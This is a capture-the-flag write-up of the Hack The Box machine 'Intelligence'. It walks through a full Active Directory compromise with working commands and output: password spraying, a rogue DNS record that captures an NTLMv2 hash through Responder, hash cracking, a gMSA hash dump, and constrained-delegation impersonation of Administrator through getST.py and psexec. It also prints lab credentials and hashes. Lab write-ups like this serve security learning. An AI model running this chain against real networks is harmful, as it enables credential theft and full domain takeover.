# HTB-Machines-Intelligence
![](https://i.imgur.com/wzQyqCa.png)


## Overview
Intelligence is an Active Directory Windows machine with a difficulty level of medium. This machine was a wonderful example of using the features of AD to go from a basic user to administrator privileges. Starting out, the web server hosts some internal documents with a naming scheme that can be extrapolated out to find more information. The documents give us a default password, and the meta-data of the documents give us a list of usernames. Using this list we can password spray the default creds to get our initial foothold on the system, and in AD that is almost always the start of a full compromise of the DC. 

Once on the machine we find a PowerShell script that is sending requests to check if the servers are up and if they aren't will email a member of the administrator group. These requests are authenticated and we can abuse that. The way the script works is pulling the DNS record, and it so happens we can add our own entry to that DNS record. When the request points at our own server, we intercept and capture the ntlmv2 hash. This hash can be cracked. 

Finally, with our newest user, we have read access to the password of a group managed service account. That GMSA has constrained delegation access to the domain controller, giving us our administrative access. 

# Initial scans and Enumeration
## Nmap
```
# Nmap 7.91 scan initiated Wed Nov  3 13:06:53 2021 as: nmap -A -p- -oN scans/nmap-p-A 10.10.10.248                                                     
Nmap scan report for 10.10.10.248                  
Host is up (0.084s latency).                       
Not shown: 65516 filtered ports                                                                                        
PORT      STATE SERVICE       VERSION                                                                                  
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:                                                                                                        
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence                                                                                             
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-04 00:22:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn 
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-11-04T00:24:06+00:00; +7h13m43s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb                                                                    
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16                                                                                
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-11-04T00:24:06+00:00; +7h13m43s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-11-04T00:24:06+00:00; +7h13m43s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-11-04T00:24:06+00:00; +7h13m43s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49702/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h13m42s, deviation: 0s, median: 7h13m42s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-11-04T00:23:29
|_  start_date: N/A

```

We can see that Kerberos(88) and DNS(53) are open. It makes me think that we are looking at an Active Directory Domain Controller. It's also interesting to see LDAP open on 4 different ports. This made me want to take a look at what information we could get from LDAP.

## LDAP Search

```
└─$ ldapsearch -h 10.129.95.154 -x -b "DC=intelligence,DC=htb"
# extended LDIF
#
# LDAPv3
# base <DC=intelligence,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

Using a few different ways to try and get some info from the LDAP protocol, we end up needing some kind of credentials for further enumeration. 

## First shots at AD
I make bold moves at Active Directory since it is a CTF and we aren't in any danger of getting caught or breaking the machine. So I like to try kerberoasting with a few basic accounts I know exist or might exist. Nothing came out of this, but I wanted to bring this up. 

Putting AD to the side for now.

## Port 80 IIS HTTP web server

![](https://i.imgur.com/0y8lAwr.png)

Looking around on the site we have very little to interact with, we have an input box for emails to get updates from the company:

![](https://i.imgur.com/evbQfZQ.png)

a few PDF links in the middle of the page:

![](https://i.imgur.com/crsbd7Y.png)

And finally a domain address with the email contact and a few other details like a date for the site. 

![](https://i.imgur.com/LuwzTd8.png)

Going back to the PDF links in the middle of the page, the date scheme being identical gives us a nice seed to fuzz with. 

![](https://i.imgur.com/deTL4xn.png)

A quick test, changing the 01 to 04 gives us another document.

![](https://i.imgur.com/RO9Dw1L.png)

We can pull all the PDF docs down, so we can look through them. First we have to make a list of files

```bash
└─$ for y in {1..12}; do for x in {1..31}; do echo "2020-$y-$x-upload.pdf"; done; $((y+1)); done                                                                                                                                       
2020-1-1-upload.pdf        
2020-1-2-upload.pdf       
2020-1-3-upload.pdf      
2020-1-4-upload.pdf      
2020-1-5-upload.pdf      
2020-1-6-upload.pdf      
2020-1-7-upload.pdf      
2020-1-8-upload.pdf      
2020-1-9-upload.pdf       
2020-1-10-upload.pdf      
2020-1-11-upload.pdf      
2020-1-12-upload.pdf      
2020-1-13-upload.pdf 
2020-1-14-upload.pdf                                  

```

The issue with this list was the padding in the single digit dates and months. 

At this point I didn't want to make a python script because it would have taken more time than doing it manually in vim. So I set up a macro in vim that will add a 0 to the current line and then move down one line attempting to explain here there is a great video with some "vim magic" on ippsec.rocks ~

```
vim noPadding.list
q > macro mode
a > save macro a
i > insert at current line
0 > the zero that inserts on the line
esc > get out of insert mode
down arrow
q > exit macro mode (saves a)
279@a > will add a 0 to the first 9 months of the year
9@a > will add a 0 to the first 9 days of the month
```

Since the machine's retirement I have seen a much better way to do this since the date format is the output of a built-in Linux command it's much easier to make this list and do the wget to get the documents off the server in 20 separate threads with xargs -P!

```bash
//snip from the official walkthrough
d=2020-01-01; while [ "$d" != `date -I` ]; do echo "http://10.10.10.248/Documents/$d-upload.pdf"; done | xargs -n 1 -P 20 wget < list 2>/dev/null
```

Since we already have our bash scripts finished and manually changed the padding with a vim macro, we are going to have wget run through our list and pull down the PDFs.

```bash
─$ for i in $(cat ../FinalPDFlist.txt); do wget http://intelligence.htb/documents/$i; done                                                                                                                                             130 ⨯ 
--2021-12-27 13:48:27--  http://intelligence.htb/documents/2020-01-01-upload.pdf                                       
Resolving intelligence.htb (intelligence.htb)... 10.129.95.154                                                         
Connecting to intelligence.htb (intelligence.htb)|10.129.95.154|:80... connected.            
HTTP request sent, awaiting response... 200 OK                                                                         
Length: 26835 (26K) [application/pdf]                                                                                  
Saving to: ‘2020-01-01-upload.pdf’                                                                                     
                                                                                                                       
2020-01-01-upload.pdf                                       100%[=========================================================================================================================================>]  26.21K  --.-KB/s    in 0.09s    
                                                                                                                       
2021-12-27 13:48:27 (301 KB/s) - ‘2020-01-01-upload.pdf’ saved [26835/26835]                                           
                                                                                                                       
--2021-12-27 13:48:27--  http://intelligence.htb/documents/2020-01-02-upload.pdf             
Resolving intelligence.htb (intelligence.htb)... 10.129.95.154                                                         
Connecting to intelligence.htb (intelligence.htb)|10.129.95.154|:80... connected.                                      
HTTP request sent, awaiting response... 200 OK                                                                         
Length: 27002 (26K) [application/pdf]                                                                                  
Saving to: ‘2020-01-02-upload.pdf’                                                                                     
                                                                                                                       
2020-01-02-upload.pdf                                       100%[=========================================================================================================================================>]  26.37K  --.-KB/s    in 0.08s    
                                                                                                                       
2021-12-27 13:48:28 (339 KB/s) - ‘2020-01-02-upload.pdf’ saved [27002/27002]                 
                                                                                                                       
--2021-12-27 13:48:28--  http://intelligence.htb/documents/2020-01-03-upload.pdf                                       
Resolving intelligence.htb (intelligence.htb)... 10.129.95.154                               
Connecting to intelligence.htb (intelligence.htb)|10.129.95.154|:80... connected.                                      
HTTP request sent, awaiting response... 404 Not Found                                                                  
2021-12-27 13:48:28 ERROR 404: Not Found.                                                                              
                                                                                                                       
--2021-12-27 13:48:28--  http://intelligence.htb/documents/2020-01-04-upload.pdf                                       
Resolving intelligence.htb (intelligence.htb)... 10.129.95.154                                                                                                                                                                                
Connecting to intelligence.htb (intelligence.htb)|10.129.95.154|:80... connected.                                      
HTTP request sent, awaiting response... 200 OK                                                                         
Length: 27522 (27K) [application/pdf]                                                                                  
Saving to: ‘2020-01-04-upload.pdf’                                                                                     
```

The next Issue is it doesn't request anything from the year 2021, so I copied the list and used sed to replace 2020 with 2021

```bash
cat twentyone.list | sed 's/2020/2021/g' > FinalList2021.txt
```


One more time through that list with wget to make sure we have all the files we are after.

```bash
└─$ for i in $(cat ../FinalList2021.txt); do wget http://intelligence.htb/documents/$i; done                                                                                                                                                  
--2021-12-27 13:53:58--  http://intelligence.htb/documents/2021-01-01-upload.pdf                                       
Resolving intelligence.htb (intelligence.htb)... 10.129.95.154                                                         
Connecting to intelligence.htb (intelligence.htb)|10.129.95.154|:80... connected.                                      
HTTP request sent, awaiting response... 404 Not Found
2021-12-27 13:53:58 ERROR 404: Not Found.

--2021-12-27 13:53:58--  http://intelligence.htb/documents/2021-01-02-upload.pdf
Resolving intelligence.htb (intelligence.htb)... 10.129.95.154
Connecting to intelligence.htb (intelligence.htb)|10.129.95.154|:80... connected.
HTTP request sent, awaiting response... 404 Not Found
2021-12-27 13:53:58 ERROR 404: Not Found.

--2021-12-27 13:53:58--  http://intelligence.htb/documents/2021-01-03-upload.pdf
Resolving intelligence.htb (intelligence.htb)... 10.129.95.154
Connecting to intelligence.htb (intelligence.htb)|10.129.95.154|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27828 (27K) [application/pdf]
Saving to: ‘2021-01-03-upload.pdf’

2021-01-03-upload.pdf                                       100%[=========================================================================================================================================>]  27.18K  --.-KB/s    in 0.08s   

2021-12-27 13:53:59 (346 KB/s) - ‘2021-01-03-upload.pdf’ saved [27828/27828]

--2021-12-27 13:53:59--  http://intelligence.htb/documents/2021-01-04-upload.pdf
Resolving intelligence.htb (intelligence.htb)... 10.129.95.154
Connecting to intelligence.htb (intelligence.htb)|10.129.95.154|:80... connected.
HTTP request sent, awaiting response... 404 Not Found
2021-12-27 13:53:59 ERROR 404: Not Found.
```

Now that we have the files, we need to see if any of the PDF info is relevant.

If we use pdfgrep (sudo apt install pdfgrep) we can search for just the string "password"

```bash
└─$ pdfgrep password 2* 

2020-06-04-upload.pdf:Please login using your username and the default password of:
2020-06-04-upload.pdf:After logging in please change your password as soon as possible.
```

Let's look at that PDF a little deeper

![](https://i.imgur.com/T8b8OkW.png)

So we have a default password of: NewIntelligenceCorpUser9876

At this point we are sort of stuck since we have no users besides maybe "contact" from the website. The key thing here is to focus on what we HAVE, and we have a bunch of PDF files. Inspecting the metadata of this PDF reveals a creator in a first.last schema. 

```bash
└─$ exiftool 2020-01-01-upload.pdf                                                                                                                                                                                                        1 ⨯
ExifTool Version Number         : 12.36
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 26 KiB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2021:12:27 13:58:09-05:00
File Inode Change Date/Time     : 2021:12:27 13:48:27-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
```
 
 Once again, we are going to iterate through all of these files and pull that creator string. Looking at more walkthroughs, exiftool will pull the field for you instead of doing the grep and awk. This was just how I did it since I wasn't aware of that at the time. 
 
 ```bash
 for i in $(ls); do exiftool $i | grep Creator | awk {'print $3'}; done >> Users.list
 ```
 
 ## Initial Foothold
 
 Now that we have played around with making word lists and finding a healthy list of Users and a default password, we need to test each user with this password.
 
 Using crackmapexec we can try all these users and list any shares and their permissions with this command
 
 ```bash
 crackmapexec smb intelligence.htb -u Users.list -p Pass.list --shares
 ```
 
 ![](https://i.imgur.com/WKE9KCV.png)

```
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         10.129.95.154   445    DC               [+] Enumerated shares
SMB         10.129.95.154   445    DC               Share           Permissions     Remark
SMB         10.129.95.154   445    DC               -----           -----------     ------
SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
SMB         10.129.95.154   445    DC               C$                              Default share
SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
SMB         10.129.95.154   445    DC               IT              READ            
SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.95.154   445    DC               Users           READ            
```

So now we have some SMB shares we can enumerate. The IT share has a PowerShell script. 

```bash
─$ smbclient \\\\intelligence.htb\\IT -U Tiffany.Molina                                                                                                 
Enter WORKGROUP\Tiffany.Molina''s password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021

                3770367 blocks of size 4096. 1458637 blocks available
smb: \> get downdetector.ps1 
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (3.5 KiloBytes/sec) (average 3.5 KiloBytes/sec)
smb: \> 

```

The contents of the ps1

```powershell
└─$ cat downdetector.ps1 
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

Some things that stand out here:
- We have a new user ted.graves we add him to our Users.list file
- This script is using the -UseDefaultCredentials in the Invoke-WebRequest
-  Having "web*" in the object name is a conditional for the try{} part of the script
-  The webrequest is pointed at record.Name and record.Name is populated from the DNS record
-  the end of the script is sending an email to Ted.Graves@intelligence.htb 


Attempting to read the DNS records with standard tools doesn't seem to give us anything but empty lists. Doing some more research, it looks like this is Active Directory Integrated DNS (ADI DNS). 

So our DNS records are in Active Directory.  Looking around, I found a tool called adidnsdump. 

```bash
└─$ adidnsdump -h                                                                                       
usage: adidnsdump [-h] [-u USERNAME] [-p PASSWORD] [--forest] [--legacy]
                  [--zone ZONE] [--print-zones] [-v] [-d] [-r] [--dns-tcp]
                  [--include-tombstoned] [--ssl] [--referralhosts]
                  [--dcfilter] [--sslprotocol SSLPROTOCOL]
                  HOSTNAME

Query/modify DNS records for Active Directory integrated DNS via LDAP

Required options:
  HOSTNAME              Hostname/ip or ldap://host:port connection string to
                        connect to

Main options:
  -h, --help            show this help message and exit
  -u USERNAME, --user USERNAME
                        DOMAIN\username for authentication.
  -p PASSWORD, --password PASSWORD
                        Password or LM:NTLM hash, will prompt if not specified
  --forest              Search the ForestDnsZones instead of DomainDnsZones
  --legacy              Search the System partition (legacy DNS storage)
  --zone ZONE           Zone to search in (if different than the current
                        domain)
  --print-zones         Only query all zones on the DNS server, no other
                        modifications are made
  -v, --verbose         Show verbose info
  -d, --debug           Show debug info
  -r, --resolve         Resolve hidden recoreds via DNS
  --dns-tcp             Use DNS over TCP
  --include-tombstoned  Include tombstoned (deleted) records
  --ssl                 Connect to LDAP server using SSL
  --referralhosts       Allow passthrough authentication to all referral hosts
  --dcfilter            Use an alternate filter to identify DNS record types
  --sslprotocol SSLPROTOCOL
                        SSL version for LDAP connection, can be SSLv23, TLSv1,
                        TLSv1_1 or TLSv1_2
```

We can pull a TON of information with this tool

![](https://i.imgur.com/JwaClRm.png)

Unfortunately it doesn't really help us right now.  The Author of the tool has lots of tools for AD, including a dnstool to write to ADI DNS records via LDAP

https://github.com/dirkjanm/krbrelayx

```bash
└─$ python3 dnstool.py -h                                                                                                                                                                                                                 2 ⨯
usage: dnstool.py [-h] [-u USERNAME] [-p PASSWORD] [--forest] [--legacy] [--zone ZONE] [--print-zones] [-r TARGETRECORD] [-a {add,modify,query,remove,resurrect,ldapdelete}] [-t {A}] [-d RECORDDATA] [--allow-multiple] [--ttl TTL]
                  HOSTNAME

Query/modify DNS records for Active Directory integrated DNS via LDAP

Required options:
  HOSTNAME              Hostname/ip or ldap://host:port connection string to connect to

Main options:
  -h, --help            show this help message and exit
  -u USERNAME, --user USERNAME
                        DOMAIN\username for authentication.
  -p PASSWORD, --password PASSWORD
                        Password or LM:NTLM hash, will prompt if not specified
  --forest              Search the ForestDnsZones instead of DomainDnsZones
  --legacy              Search the System partition (legacy DNS storage)
  --zone ZONE           Zone to search in (if different than the current domain)
  --print-zones         Only query all zones on the DNS server, no other modifications are made

Record options:
  -r TARGETRECORD, --record TARGETRECORD
                        Record to target (FQDN)
  -a {add,modify,query,remove,resurrect,ldapdelete}, --action {add,modify,query,remove,resurrect,ldapdelete}
                        Action to perform. Options: add (add a new record), modify (modify an existing record), query (show existing), remove (mark record for cleanup from DNS cache), delete (delete from LDAP). Default: query
  -t {A}, --type {A}    Record type to add (Currently only A records supported)
  -d RECORDDATA, --data RECORDDATA
                        Record data (IP address)
  --allow-multiple      Allow multiple A records for the same name
  --ttl TTL             TTL for record (default: 180)
```

NewIntelligenceCorpUser9876

```bash
└─$ python3 dnstool.py -u intelligence.htb\\Tiffany.Molina 10.129.95.154 -r webtest -d 10.10.14.127 -a add -t A                                                                                                                           2 ⨯
Password: 
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
/home/kali/OSCP/ExamReview2.0/HTB/Intelligence-10.10.10.248/exploit/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead
  res = dnsresolver.query(zone, 'SOA')
[-] Adding new record
[+] LDAP operation completed successfully
```

Seems like we wrote our IP to the DNS server with a "web like" name we can spin up responder and see if we get a response the next 5 mins...

```
sudo responder -I tun0

...snip...

[HTTP] NTLMv2 Client   : ::ffff:10.129.95.154
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:913c09fbb9f65b07:D2CD9538A907F3140F19B8248FDB574E:01010000000000001294274FA5FBD701B6C497A98DFF50D20000000002000800590042005900580001001E00570049004E002D00480046005000500043004800430049004200530052000400140059004200590058002E004C004F00430041004C0003003400570049004E002D00480046005000500043004800430049004200530052002E0059004200590058002E004C004F00430041004C000500140059004200590058002E004C004F00430041004C00080030003000000000000000000000000020000098CF6DEFBE98BFDA13963412AB8857005EC503DD661AD01A1357B797211AD1760A0010000000000000000000000000000000000009003A0048005400540050002F0077006500620074006500730074002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000

```

We get our ntlmv2 hash!


```bash
└─$ john tedHash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mr.Teddy         (Ted.Graves)     
1g 0:00:00:03 DONE (2021-12-27 15:47) 0.2631g/s 2846Kp/s 2846Kc/s 2846KC/s Mrz.browntillthedayidie..Montez11
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

## PrivEsc
The NTLMv2 hash cracked successfully and we are now Mr.Teddy!
ted.graves:Mr.Teddy

It doesn't look like Ted can do much more than Tiffany in SMB. Looking at winrm and a few other entry points, we don't get very far. 

Figuring out Ted and Tiffany's permissions is going to be important, so I decided to use a few tools to enumerate AD users and permissions. 

```
─$ ldapdomaindump -u 'intelligence.htb\ted.graves' -p 'Mr.Teddy' intelligence.htb -o ldapDump


[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

This spits out HTML so it's nice to look at in a browser. So we cd into /ldapDump and set up a python server to browse

![](https://i.imgur.com/lREhgpG.png)

We can see some user info and some interesting flags in domain_computer.html

![](https://i.imgur.com/2H7bVKq.png)

*WORKSTATION_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION*


This is a good chunk of info, and we should dig a bit deeper into our ITSUPPORT user Ted.Graves.

Now it's time to get a bloodhound graph view, cause It's just so much more simple to understand what's going on. Our previous ldpdomaindump can be converted into this, or we can run the python version of bloodhound locally with our user creds

```bash
└─$ bloodhound-python -d intelligence.htb -u Ted.Graves -p Mr.Teddy -c all -ns 10.129.95.154                                                             

INFO: Found AD domain: intelligence.htb
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 42 users
INFO: Found 54 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: svc_int.intelligence.htb
INFO: Querying computer: dc.intelligence.htb
WARNING: Could not resolve: svc_int.intelligence.htb: The DNS operation timed out after 3.203798294067383 seconds
INFO: Done in 00M 11S

```

```bash
sudo neo4j start && bloodhound
```

Dragging the json files over into bloodhound will import all the data, so we can get our graph view.

![](https://i.imgur.com/JKFvCS2.png)

Taking a look around, we find the computer we saw in our LDAP dump and see the allowed to delegate flag

![](https://i.imgur.com/jGrn8Za.png)

Some example queries that can help us to dig more:
https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/


We don't end up finding more than we did with the LDAP dump (edit: after looking at other write ups this just wasnt working for me but worked for others.)
![](https://i.imgur.com/RH7G2ak.png)


Going even further in our search, we use ldapsearch again:

```
─$ ldapsearch -H ldap://intelligence.htb -x -W -D "Ted.Graves@intelligence.htb" -b "dc=intelligence,dc=htb" > LdapSearch.out
```

After digging around, we find the svc_int service account. 

```bash
...snip...
# svc_int, Managed Service Accounts, intelligence.htb
dn: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
objectClass: computer
objectClass: msDS-GroupManagedServiceAccount # This is telling us we have a GMSA
cn: svc_int
distinguishedName: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=h
 tb
instanceType: 4
whenCreated: 20210419004958.0Z
whenChanged: 20211228050648.0Z
uSNCreated: 12846
uSNChanged: 110700
name: svc_int
objectGUID:: eaCA8SbzskmEoTSCQgjWQg==
userAccountControl: 16781312 # this is specifying the delegation and some other permissions
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 132694881825534026
localPolicyFlags: 0
pwdLastSet: 132851416085398932
primaryGroupID: 515
objectSid:: AQUAAAAAAAUVAAAARobx+nQXDcpGY+TMeAQAAA==
accountExpires: 9223372036854775807
logonCount: 1
sAMAccountName: svc_int$
sAMAccountType: 805306369
dNSHostName: svc_int.intelligence.htb
objectCategory: CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configurat
 ion,DC=intelligence,DC=htb
isCriticalSystemObject: FALSE
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132694881825534026
msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb  #We end up needing this too for our silver ticket!
```

Now that we know more about the service account that has the delegate flag set, let's see if we can get its password. We take a long shot and see if gMSADumper.py will give us the password for svc_int$.

```bash
└─$ python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l 10.129.166.61 -d intelligence.htb                                                                 

Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::09829b63fdf7bd623fc3f4f7b3cc9905
```

We can give this a go with john or hashcat to try and get the plain text password but since this is a managed service account the password should be rather complex so it most likely won't get us a password through a word list. Instead, we can get a silver ticket through our constrained delegation privileges. 

This is attempting to get a ticket from Kerberos so we should sync our time with the server. 

```bash
ntpdate -s intelligence.htb
```

Impacket has a way to pull a silver ticket down to a machine pass. 

```bash
└─$ getST.py -h
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

usage: getST.py [-h] -spn SPN [-impersonate IMPERSONATE] [-ts] [-debug]
                [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
                [-dc-ip ip address]
                identity

Given a password, hash or aesKey, it will request a Service Ticket and save it
as ccache

positional arguments:
  identity              [domain/]username[:password]

optional arguments:
  -h, --help            show this help message and exit
  -spn SPN              SPN (service/server) of the target service the service
                        ticket will be generated for
  -impersonate IMPERSONATE
                        target username that will be impersonated (thru
                        S4U2Self) for quering the ST. Keep in mind this will
                        only work if the identity provided in this scripts is
                        allowed for delegation to the SPN specified
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              dont ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on target parameters.
                        If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)
  -dc-ip ip address     IP Address of the domain controller. If ommited it use
                        the domain part (FQDN) specified in the target
                        parameter
                                                                             
```

So we need to impersonate the Administrator, our SPN is the WWW we saw in the ldapsearch, and we can pass a hash to our impacket tool. 
When attempting to interact with Kerberos make sure to sync your time, or you will see:
```bash
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

After a few rounds of syncing, we get our machine creds. 

```bash
└─$ getST.py intelligence.htb/svc_int -hashes 09829b63fdf7bd623fc3f4f7b3cc9905:09829b63fdf7bd623fc3f4f7b3cc9905 -impersonate Administrator -spn WWW/dc.intelligence.htb
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

So now we have a file named Administrator.ccache we should set that to an environment variable for easier usage.

```bash
export KRB5CCNAME=Administrator.ccache
```

```
└─$ smbclient.py -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Type help for list of commands
# help

 open {host,port=445} - opens a SMB connection against the target host/port
 login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
 kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
 login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
 logoff - logs off
 shares - list available shares
 use {sharename} - connect to an specific share
 cd {path} - changes the current directory to {path}
 lcd {path} - changes the current local directory to {path}
 pwd - shows current remote directory
 password - changes the user password, the new password will be prompted for input
 ls {wildcard} - lists all the files in the current directory
 rm {file} - removes the selected file
 mkdir {dirname} - creates the directory under the current path
 rmdir {dirname} - removes the directory under the current path
 put {filename} - uploads the filename into the current path
 get {filename} - downloads the filename from the current path
 mount {target,path} - creates a mount point from {path} to {target} (admin required)
 umount {path} - removes the mount point at {path} without deleting the directory (admin required)
 list_snapshots {path} - lists the vss snapshots for the specified path
 info - returns NetrServerInfo main results
 who - returns the sessions currently connected at the target host (admin required)
 close - closes the current SMB Session
 exit - terminates the server process (and this session)


# 
```

So it looks like it's working, but we want to get a shell
```bash
└─$ psexec.py intelligence.htb/Administrator@dc.intelligence.htb -k -no-pass                                       1 ⨯
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on dc.intelligence.htb.....
[*] Found writable share ADMIN$
[*] Uploading file UOuYsqTO.exe
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Creating service jEDJ on dc.intelligence.htb.....
[*] Starting service jEDJ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

# Conclusion

This machine was a blast. It took me many days to get right and lots of research into things that ended up not being relevant to this machine but will become useful in the future. Active Directory is always surprising me with more and more "features" that end up giving clever users more privileges than initially allowed. 

I also love being able to use basic Linux tools to create and organize word lists. This box was a great example of knowing the right way to do it (probably python) but trying to work out the formatting and scripting in bash to get the same output. I always play the game in my head of would I be able to type it out faster than building the script to automate it. In this case, I did a little of both. 

Thanks for reading, 

Dan

